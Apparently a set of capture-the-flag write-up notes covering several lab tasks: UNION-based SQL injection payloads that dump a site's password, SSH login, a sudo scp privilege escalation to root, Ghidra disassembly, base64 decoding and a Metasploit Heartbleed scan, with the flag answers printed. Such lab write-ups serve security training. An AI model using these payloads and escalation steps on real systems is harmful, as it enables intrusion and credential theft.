# [Task 3] [Scripting] [Medium] Gotta Catch em All
```python
import requests
import re
import time
url = "http://10.10.207.179:"
first_port = 3010
result_number=0

response = requests.get(url+str(first_port))
cut_response = response.text[853:]
next_port = re.match(r"[0-9]+",cut_response).group(0)
print(response.text)
while True:
  next_url=url+next_port
  print(next_url)
  try:
    response = requests.get(next_url)
  except Exception :
    time.sleep(1)
    try:
      time.sleep(1)
      response = requests.get(next_url)
    except Exception:
      response = requests.get(next_url)
  operations = response.text.split(" ")

  if operations[0] =="STOP":
    print("STOP")
    break
  elif operations[0] == "add":
    result_number = result_number + int(operations[1])
  elif operations[0] == "minus":
    result_number = result_number - int(operations[1])
  elif operations[0] == "multiply":
    result_number = result_number * int(operations[1])
  elif operations[0] == "divide":
    result_number = result_number / int(operations[1])
  else:
    print(operations[0]) 
    break
  next_port = operations[2]
print("result_number:"+str(result_number))
 
```
# [Web Exploitation] [Medium] Jurassic Park
## nmap
```
Nmap scan report for ip-10-10-85-206.eu-west-1.compute.internal (10.10.85.206)
Host is up (0.00050s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6e:ae:f8:c2:2f:da:72:a3:08:86:ba:01:c8:18:78:e4 (RSA)
|   256 b8:1e:6e:09:45:07:27:28:b0:e5:a3:80:70:81:38:fc (ECDSA)
|_  256 c1:24:1c:03:c9:15:a0:43:f5:2a:de:33:d5:22:d1:57 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Jarassic Park
MAC Address: 02:98:F1:A2:81:AA (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.10 - 3.13
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.50 ms ip-10-10-85-206.eu-west-1.compute.internal (10.10.85.206)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.26 seconds
root@kali:~#

```
## robots
```
HTTP/1.1 200 OK
Date: Sat, 16 May 2020 01:52:24 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Sat, 16 Feb 2019 18:49:27 GMT
ETag: "11-5820759d53c9f"
Accept-Ranges: bytes
Content-Length: 17
Connection: close
Content-Type: text/plain

Wubbalubbadubdub

```
### Wubbalubbadubdub
```
HTTP/1.1 404 Not Found
Date: Sat, 16 May 2020 01:54:12 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 292
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /Wubbalubbadubdub was not found on this server.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.85.206 Port 80</address>
</body></html>
```

## shop
- 5
```html
GET /item.php?id=5 HTTP/1.1
Host: 10.10.85.206
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.85.206/shop.php
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Date: Sat, 16 May 2020 01:56:00 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1669
Connection: close
Content-Type: text/html; charset=UTF-8

<link rel="icon" type="image/png" href="assets/favicon.png"/>

<!DOCTYPE html>
<html lang="en">
<head>
  <title>Buy, Buy, Buy</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
  <style>
    * {
      font-family: "Courier New", Times, serif;
    }
    body {
      background-color: #2f2e2e;
      color: white;
    }

    .black {
      position:relative;
      top: -20px;
      padding-top: 40px;
      background-color: black;
      color: white;
      width: 100%;
      box-shadow: 4px 0px 4px 4px black;
    }

    .row {
      color: black;
    }

    .card-img-top {
      height: 200px;
      object-fit: cover;
    }

    .card {
      background-color: rgb(162, 162, 164);
      -webkit-box-shadow: 0px 0px 21px 2px rgba(0,0,0,0.75);
      -moz-box-shadow: 0px 0px 21px 2px rgba(0,0,0,0.75);
      box-shadow: 0px 0px 21px 2px rgba(0,0,0,0.75);
      border:0;
    }

  </style>
</head>
<body>
  <section class='black text-center'>
    <a href="/index.php"><img width=300px src="assets/Jurassic-Park-Logo.png"></a></br></br>
    <h1>Development Package</h1></br>
  </section>
  <div class="container text-center">
    <h3>Price: $0</h3></br>
    <div class="alert alert-primary" role="alert"><b>0</b> of these packages have been sold in the last hour.</div></br>
    <h4>Dennis, why have you blocked these characters: ' # DROP - username @ ---- Is this our WAF now?</h4>
    </br><h4>Order yours quick by calling us!</h4>

  </div>
</body>
</html>

```

- 100
```html
<body>
  <section class='black text-center'>
    <a href="/index.php"><img width=300px src="assets/Jurassic-Park-Logo.png"></a></br></br>
    <h1>... Package</h1></br>
  </section>
  <div class="container text-center">
    <h3>Price: $-1</h3></br>
    <div class="alert alert-primary" role="alert"><b>-1</b> of these packages have been sold in the last hour.</div></br>
    <h4>Nope</h4>
    </br><h4>Order yours quick by calling us!</h4>

  </div>
</body>
</html>

```

```html
GET /item.php?id=' HTTP/1.1
Host: 10.10.85.206
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.85.206/shop.php
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Date: Sat, 16 May 2020 02:03:53 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1944
Connection: close
Content-Type: text/html; charset=UTF-8

<link rel="icon" type="image/png" href="assets/favicon.png"/>
<style>* {margin: 0; padding: 0; font-family: "Courier New", Times, serif; background-color: #0102a7; color: white; } .error {background-color: white; color: black;}</style>
            <!--<div class="error">Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near "%" at line 20</div>-->
            <center></br></br>
              <img class="text-center" src="assets/magic.gif"></br></br><div id="magicwork">access: <b>PERMISSION DEINED</b>...and...</br></br></div>
            </center>
            <video src="assets/magic.mp3" autoplay></video>
            <script>
              function sleep(ms) {
                return new Promise(resolve => setTimeout(resolve, ms));
              }

              async function lol() {
                let i = 1;
                while(i < 100) {
                  document.querySelector("#magicwork").innerHTML += "<b>YOU DIDN'T SAY THE MAGIC WORD!</b></br>"
                  await sleep(50)
                  i++;
                }
                document.querySelector("#magicwork").innerHTML += "Try SqlMap.. I dare you.."
              }

              async function play() {
                return new Promise(async function (resolve, reject) {
                  console.log("in")
                  var audioElement = document.createElement("audio");
                  audioElement.setAttribute("src", "assets/lel.ogg");
                  audioElement.load()
                  audioElement.addEventListener("load", function() {
                    audioElement.play();
                    console.log("in2")
                    return resolve()
                  }, true);
                })
              }

              (async function () {
                  play()
                  await lol()
              })();

            </script>
```

```html
http://10.10.85.206/item.php?id=5%20union%20select%201,2,3,4,5

2,3,4,5 show up in the view
<body>
  <section class='black text-center'>
    <a href="/index.php"><img width=300px src="assets/Jurassic-Park-Logo.png"></a></br></br>
    <h1>2 Package</h1></br>
  </section>
  <div class="container text-center">
    <h3>Price: $3</h3></br>
    <div class="alert alert-primary" role="alert"><b>5</b> of these packages have been sold in the last hour.</div></br>
    <h4>4</h4>
    </br><h4>Order yours quick by calling us!</h4>

  </div>
</body>

http://10.10.85.206/item.php?id=5%20union%20select%201,database(),3,4,5

<body>
  <section class='black text-center'>
    <a href="/index.php"><img width=300px src="assets/Jurassic-Park-Logo.png"></a></br></br>
    <h1>park Package</h1></br>
  </section>
  <div class="container text-center">
    <h3>Price: $3</h3></br>
    <div class="alert alert-primary" role="alert"><b>5</b> of these packages have been sold in the last hour.</div></br>
    <h4>4</h4>
    </br><h4>Order yours quick by calling us!</h4>

  </div>
</body>

http://10.10.85.206/item.php?id=5%20union%20select%201,version(),3,4,5

<body>
  <section class='black text-center'>
    <a href="/index.php"><img width=300px src="assets/Jurassic-Park-Logo.png"></a></br></br>
    <h1>5.7.25-0ubuntu0.16.04.2 Package</h1></br>
  </section>
  <div class="container text-center">
    <h3>Price: $3</h3></br>
    <div class="alert alert-primary" role="alert"><b>5</b> of these packages have been sold in the last hour.</div></br>
    <h4>4</h4>
    </br><h4>Order yours quick by calling us!</h4>

  </div>
</body>

http://10.10.85.206/item.php?id=5%20union%20select%201,password,3,4,5%20from%20users

<body>
  <section class='black text-center'>
    <a href="/index.php"><img width=300px src="assets/Jurassic-Park-Logo.png"></a></br></br>
    <h1>ih8dinos Package</h1></br>
  </section>
  <div class="container text-center">
    <h3>Price: $3</h3></br>
    <div class="alert alert-primary" role="alert"><b>5</b> of these packages have been sold in the last hour.</div></br>
    <h4>4</h4>
    </br><h4>Order yours quick by calling us!</h4>

  </div>
</body>

```

## ssh
```
oot@kali:~# ssh dennis@10.10.85.206
The authenticity of host '10.10.85.206 (10.10.85.206)' can't be established.
ECDSA key fingerprint is SHA256:2HTQe3EdXw/zeZTHL8qFhGmpPtes7Lq22WR4LBOsfNE.
Are you sure you want to continue connecting (yes/no/[fingerprint])?
y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.10.85.206' (ECDSA) to the list of known hosts.
dennis@10.10.85.206's password:
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-1072-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  Get cloud support with Ubuntu Advantage Cloud Guest:
    http://www.ubuntu.com/business/services/cloud

62 packages can be updated.
45 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

dennis@ip-10-10-85-206:~$
```

## flag1
```
dennis@ip-10-10-85-206:~$ cat flag1.txt
Congrats on finding the first flag.. But what about the rest? :O

b89f2d69c56b9981ac92dd267f
dennis@ip-10-10-85-206:~$
```

## flag2
```
dennis@ip-10-10-85-206:~$ ls -al
total 44
drwxr-xr-x 3 dennis dennis 4096 May 16 02:31 .
drwxr-xr-x 4 root   root   4096 Feb 16  2019 ..
-rw------- 1 dennis dennis 1001 Feb 16  2019 .bash_history
-rw-r--r-- 1 dennis dennis  220 Feb 16  2019 .bash_logout
-rw-r--r-- 1 dennis dennis 3771 Feb 16  2019 .bashrc
drwx------ 2 dennis dennis 4096 May 16 02:31 .cache
-rw-rw-r-- 1 dennis dennis   93 Feb 16  2019 flag1.txt
-rw-r--r-- 1 dennis dennis  655 Feb 16  2019 .profile
-rw-rw-r-- 1 dennis dennis   32 Feb 16  2019 test.sh
-rw------- 1 dennis dennis 4350 Feb 16  2019 .viminfo
dennis@ip-10-10-85-206:~$ cat test.sh
#!/bin/bash
cat /root/flag5.txt
dennis@ip-10-10-85-206:~$ chmod +x test.sh
dennis@ip-10-10-85-206:~$ ./test.sh
cat: /root/flag5.txt: Permission denied
dennis@ip-10-10-85-206:~$ find / -iname "*flag*" -type f 2>>/dev/null
/proc/sys/kernel/acpi_video_flags
/proc/kpageflags
/home/dennis/flag1.txt
/sys/devices/pnp0/00:06/tty/ttyS0/flags
/sys/devices/vif-0/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/usr/share/perl5/Dpkg/BuildFlags.pm
/usr/share/man/man3/X509_VERIFY_PARAM_set_flags.3ssl.gz
/usr/share/man/man3/Dpkg::BuildFlags.3.gz
/usr/share/man/man3/SSL_CONF_CTX_set_flags.3ssl.gz
/usr/share/man/man1/dpkg-buildflags.1.gz
/usr/share/man/de/man1/dpkg-buildflags.1.gz
/usr/share/man/sv/man1/dpkg-buildflags.1.gz
/usr/share/man/fr/man1/dpkg-buildflags.1.gz
/usr/share/dpkg/buildflags.mk
/usr/include/linux/kernel-page-flags.h
/usr/include/linux/tty_flags.h
/usr/include/x86_64-linux-gnu/asm/processor-flags.h
/usr/include/x86_64-linux-gnu/bits/waitflags.h
/usr/bin/dpkg-buildflags
/usr/src/linux-aws-headers-4.4.0-1072/include/linux/page-flags.h
/usr/src/linux-aws-headers-4.4.0-1072/include/linux/kernel-page-flags.h
/usr/src/linux-aws-headers-4.4.0-1072/include/linux/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/include/linux/pageblock-flags.h
/usr/src/linux-aws-headers-4.4.0-1072/include/linux/page-flags-layout.h
/usr/src/linux-aws-headers-4.4.0-1072/include/uapi/linux/kernel-page-flags.h
/usr/src/linux-aws-headers-4.4.0-1072/include/uapi/linux/tty_flags.h
/usr/src/linux-aws-headers-4.4.0-1072/include/asm-generic/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/include/trace/events/gfpflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/h8300/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/nios2/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/c6x/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/avr32/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/frv/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/arm/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/m32r/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/s390/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/powerpc/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/hexagon/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/arm64/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/alpha/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/unicore32/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/cris/include/arch-v32/arch/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/cris/include/arch-v10/arch/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/cris/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/arc/include/asm/irqflags-compact.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/arc/include/asm/irqflags-arcv2.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/arc/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/microblaze/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/m68k/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/xtensa/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/x86/include/uapi/asm/processor-flags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/x86/include/asm/processor-flags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/x86/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/x86/kernel/cpu/mkcapflags.sh
/usr/src/linux-aws-headers-4.4.0-1072/arch/metag/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/mips/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/mn10300/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/openrisc/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/score/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/um/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/sh/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/ia64/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/tile/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/blackfin/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/sparc/include/asm/irqflags_32.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/sparc/include/asm/irqflags_64.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/sparc/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/parisc/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/scripts/coccinelle/locks/flags.cocci
/usr/src/linux-headers-4.4.0-1072-aws/include/config/zone/dma/flag.h
/usr/lib/php/20151012/build/ax_check_compile_flag.m4
/usr/lib/x86_64-linux-gnu/perl/5.22.1/bits/waitflags.ph
/boot/grub/fonts/flagTwo.txt
dennis@ip-10-10-85-206:~$ cat /boot/grub/fonts/flagTwo.txt
96ccd6b429be8c9a4b501c7a0b117b0a
```

## flag3
```
dennis@ip-10-10-85-206:~$ cat .bash_history
Flag3:b4973bbc9053807856ec815db25fb3f1
sudo -l
sudo scp
scp
sudo find
ls
vim test.sh
ls
cd ~
ls
vim test.sh
ls
ls -la
sudo scp -S test.sh
sudo scp /etc/password
sudo scp /etc/password localhost@10.8.0.6@~/
sudo scp /etc/passwd localhost@10.8.0.6@~/
sudo scp /etc/passwd dennis@10.0.0.59@~/
sudo scp /etc/passwd dennis@10.0.0.59:~/
sudo scp /etc/passwd dennis@10.0.0.59:/home/dennis
sudo scp /etc/passwd ben@10.8.0.6:/
sudo scp /root/flag5.txt ben@10.8.0.6:/
sudo scp /root/flag5.txt ben@10.8.0.6:~/
sudo scp /root/flag5.txt ben@10.8.0.6:~/ -v
sudo scp -v /root/flag5.txt ben@10.8.0.6:~/
sudo scp -v /root/flag5.txt ben@localhost:~/
sudo scp -v /root/flag5.txt dennis@localhost:~/
sudo scp -v /root/flag5.txt dennis@10.0.0.59:~/
sudo scp -v /root/flag5.txt ben@10.8.0.6:~/
ping 10.8.0.6
ping 10.8.0.7
sudo scp /root/flag5.txt ben@10.8.0.6:~/
sudo scp /root/flag5.txt ben@88.104.10.206:~/
sudo scp -v /root/flag5.txt ben@88.104.10.206:~/
sudo scp /root/flag5.txt ben@10.8.0.6:~/
ls
vim ~/.bash_history
dennis@ip-10-10-85-206:~$


```


## flag5
```
dennis@ip-10-10-85-206:/tmp$ sudo -l
Matching Defaults entries for dennis on ip-10-10-85-206.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dennis may run the following commands on ip-10-10-85-206.eu-west-1.compute.internal:
    (ALL) NOPASSWD: /usr/bin/scp
dennis@ip-10-10-85-206:/tmp$ TF=$(mktemp)
dennis@ip-10-10-85-206:/tmp$ echo 'sh 0<&2 1>&2' > $TF
dennis@ip-10-10-85-206:/tmp$ chmod +x "$TF"
dennis@ip-10-10-85-206:/tmp$ sudo scp -S $TF x y:
# whoami
root
# cd /root
# ls
flag5.txt  snap
# cat flag5.txt
2a7074e491fcacc7eeba97808dc5e2ec
#
```
# [Task 5] [Scripting] [Easy] Base64

```
50 time base64 decode
root@kali:~# cat b64.txt |base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d
HackBack2019=root@kali:~#
```
# [Task 6] [Reverse Engineering] [Easy] Secret Encryption
## ghidra

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         AL:1           <RETURN>
             undefined8        Stack[-0x10]:8 local_10                                XREF[2]:     001007fb(W), 
                                                                                                   0010090b(R)  
             undefined1        Stack[-0x1a]:1 local_1a                                XREF[1]:     00100814(*)  
             undefined4        Stack[-0x20]:4 local_20                                XREF[2]:     001008cd(W), 
                                                                                                   001008d0(R)  
             undefined4        Stack[-0x24]:4 local_24                                XREF[6]:     00100801(W), 
                                                                                                   0010083d(R), 
                                                                                                   00100843(R), 
                                                                                                   001008a4(R), 
                                                                                                   001008ec(RW), 
                                                                                                   001008f0(R)  
             undefined1        Stack[-0x25]:1 local_25                                XREF[11]:    00100867(W), 
                                                                                                   0010086d(W), 
                                                                                                   00100873(W), 
                                                                                                   00100879(W), 
                                                                                                   0010087f(W), 
                                                                                                   00100885(W), 
                                                                                                   0010088b(W), 
                                                                                                   00100891(W), 
                                                                                                   00100897(W), 
                                                                                                   0010089d(W), 
                                                                                                   001008bf(R)  
             undefined1        Stack[-0x26]:1 local_26                                XREF[2]:     001008b8(W), 
                                                                                                   001008bb(R)  
                             main                                            XREF[3]:     Entry Point(*), 
                                                                                          _start:0010066d(*), 00100a88  
        001007ea 55              PUSH       RBP
        001007eb 48 89 e5        MOV        RBP,RSP
        001007ee 48 83 ec 20     SUB        RSP,0x20
        001007f2 64 48 8b        MOV        RAX,qword ptr FS:[0x28]
                 04 25 28 
                 00 00 00
        001007fb 48 89 45 f8     MOV        qword ptr [RBP + local_10],RAX
        001007ff 31 c0           XOR        EAX,EAX
        00100801 c7 45 e4        MOV        dword ptr [RBP + local_24],0x0
                 00 00 00 00
        00100808 48 8d 3d        LEA        RDI,[s_Enter_The_Correct_Password_001009b8]      = "Enter The Correct Password"
                 a9 01 00 00
        0010080f e8 ec fd        CALL       puts                                             int puts(char * __s)
                 ff ff
        00100814 48 8d 45 ee     LEA        RAX=>local_1a,[RBP + -0x12]
        00100818 48 89 c6        MOV        RSI,RAX
        0010081b 48 8d 3d        LEA        RDI,[DAT_001009d3]                               = 25h    %
                 b1 01 00 00
        00100822 b8 00 00        MOV        EAX,0x0
                 00 00
        00100827 e8 f4 fd        CALL       __isoc99_scanf                                   undefined __isoc99_scanf()
                 ff ff
        0010082c e9 bf 00        JMP        LAB_001008f0
                 00 00
                             LAB_00100831                                    XREF[1]:     001008f4(j)  
        00100831 48 8d 3d        LEA        RDI,[s_in_while_loop_001009d6]                   = "in while loop"
                 9e 01 00 00
        00100838 e8 c3 fd        CALL       puts                                             int puts(char * __s)
                 ff ff
        0010083d 83 7d e4 09     CMP        dword ptr [RBP + local_24],0x9
        00100841 77 60           JA         LAB_001008a3
        00100843 8b 45 e4        MOV        EAX,dword ptr [RBP + local_24]
        00100846 48 8d 14        LEA        RDX,[RAX*0x4]
                 85 00 00 
                 00 00
        0010084e 48 8d 05        LEA        RAX,[switchD_00100865::switchdataD_00100a2c]     = FFFFFE3Bh
                 d7 01 00 00
        00100855 8b 04 02        MOV        EAX=>switchD_00100865::switchdataD_00100a2c,dw   = FFFFFE3Bh
        00100858 48 63 d0        MOVSXD     RDX,EAX
        0010085b 48 8d 05        LEA        RAX,[switchD_00100865::switchdataD_00100a2c]     = FFFFFE3Bh
                 ca 01 00 00
        00100862 48 01 d0        ADD        RAX,RDX
                             switchD_00100865::switchD
        00100865 ff e0           JMP        RAX
                             switchD_00100865::caseD_0                       XREF[1]:     00100865(j)  
        00100867 c6 45 e3 54     MOV        byte ptr [RBP + local_25],0x54
        0010086b eb 37           JMP        switchD_00100865::caseD_a
                             switchD_00100865::caseD_1                       XREF[1]:     00100865(j)  
        0010086d c6 45 e3 48     MOV        byte ptr [RBP + local_25],0x48
        00100871 eb 31           JMP        switchD_00100865::caseD_a
                             switchD_00100865::caseD_2                       XREF[1]:     00100865(j)  
        00100873 c6 45 e3 4d     MOV        byte ptr [RBP + local_25],0x4d
        00100877 eb 2b           JMP        switchD_00100865::caseD_a
                             switchD_00100865::caseD_3                       XREF[1]:     00100865(j)  
        00100879 c6 45 e3 52     MOV        byte ptr [RBP + local_25],0x52
        0010087d eb 25           JMP        switchD_00100865::caseD_a
                             switchD_00100865::caseD_4                       XREF[1]:     00100865(j)  
        0010087f c6 45 e3 41     MOV        byte ptr [RBP + local_25],0x41
        00100883 eb 1f           JMP        switchD_00100865::caseD_a
                             switchD_00100865::caseD_5                       XREF[1]:     00100865(j)  
        00100885 c6 45 e3 4e     MOV        byte ptr [RBP + local_25],0x4e
        00100889 eb 19           JMP        switchD_00100865::caseD_a
                             switchD_00100865::caseD_6                       XREF[1]:     00100865(j)  
        0010088b c6 45 e3 44     MOV        byte ptr [RBP + local_25],0x44
        0010088f eb 13           JMP        switchD_00100865::caseD_a
                             switchD_00100865::caseD_7                       XREF[1]:     00100865(j)  
        00100891 c6 45 e3 45     MOV        byte ptr [RBP + local_25],0x45
        00100895 eb 0d           JMP        switchD_00100865::caseD_a
                             switchD_00100865::caseD_8                       XREF[1]:     00100865(j)  
        00100897 c6 45 e3 4e     MOV        byte ptr [RBP + local_25],0x4e
        0010089b eb 07           JMP        switchD_00100865::caseD_a
                             switchD_00100865::caseD_9                       XREF[1]:     00100865(j)  
        0010089d c6 45 e3 43     MOV        byte ptr [RBP + local_25],0x43

http://web-apps.nbookmark.com/ascii-converter/
54 48 4d 52 41 4e 44 45 4e 43
THMRANDENC
```
# [Task 7] [Web Exploitation] [Easy] Protecting Data In Transit
```
root@kali:~# msfconsole
[-] ***rting the Metasploit Framework console.../
[-] * WARNING: No database support: No database YAML file
[-] ***


Unable to handle kernel NULL pointer dereference at virtual address 0xd34db33f
EFLAGS: 00010046
eax: 00000001 ebx: f77c8c00 ecx: 00000000 edx: f77f0001
esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60
ds: 0018   es: 0018  ss: 0018
Process Swapper (Pid: 0, process nr: 0, stackpage=80377000)


Stack: 90909090990909090990909090
       90909090990909090990909090
       90909090.90909090.90909090
       90909090.90909090.90909090
       90909090.90909090.09090900
       90909090.90909090.09090900
       ..........................
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       ccccccccc.................
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       .................ccccccccc
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       ..........................
       ffffffffffffffffffffffffff
       ffffffff..................
       ffffffffffffffffffffffffff
       ffffffff..................
       ffffffff..................
       ffffffff..................


Code: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 00 00 00 00
Aiee, Killing Interrupt handler
Kernel panic: Attempted to kill the idle task!
In swapper task - not syncing


       =[ metasploit v5.0.71-dev                          ]
+ -- --=[ 1962 exploits - 1095 auxiliary - 336 post       ]
+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > search heatblead
[-] No results from search
msf5 > search HeartBleed

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  Yes    OpenSSL Heartbeat (Heartbleed) Information Leak
   1  auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  No     OpenSSL Heartbeat (Heartbleed) Client Memory Exposure


msf5 > use 0
msf5 auxiliary(scanner/ssl/openssl_heartbleed) > show options

Module options (auxiliary/scanner/ssl/openssl_heartbleed):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   DUMPFILTER                         no        Pattern to filter leaked memory before storing
   LEAK_COUNT        1                yes       Number of times to leak memory per SCAN or DUMP invocation
   MAX_KEYTRIES      50               yes       Max tries to dump key
   RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a server response
   RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             443              yes       The target port (TCP)
   STATUS_EVERY      5                yes       How many retries until key dump status
   THREADS           1                yes       The number of concurrent threads (max one per host)
   TLS_CALLBACK      None             yes       Protocol to use, "None" to use raw TLS sockets (Accepted: None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES)
   TLS_VERSION       1.0              yes       TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1, 1.2)


Auxiliary action:

   Name  Description
   ----  -----------
   SCAN  Check hosts for vulnerability


msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set RHOST 10.10.142.176
RHOST => 10.10.142.176
msf5 auxiliary(scanner/ssl/openssl_heartbleed) > ex
exit     exploit
msf5 auxiliary(scanner/ssl/openssl_heartbleed) > exploit

[+] 10.10.142.176:443     - Heartbeat response with leak, 65535 bytes
[*] 10.10.142.176:443     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssl/openssl_heartbleed) > run

[+] 10.10.142.176:443     - Heartbeat response with leak, 65535 bytes
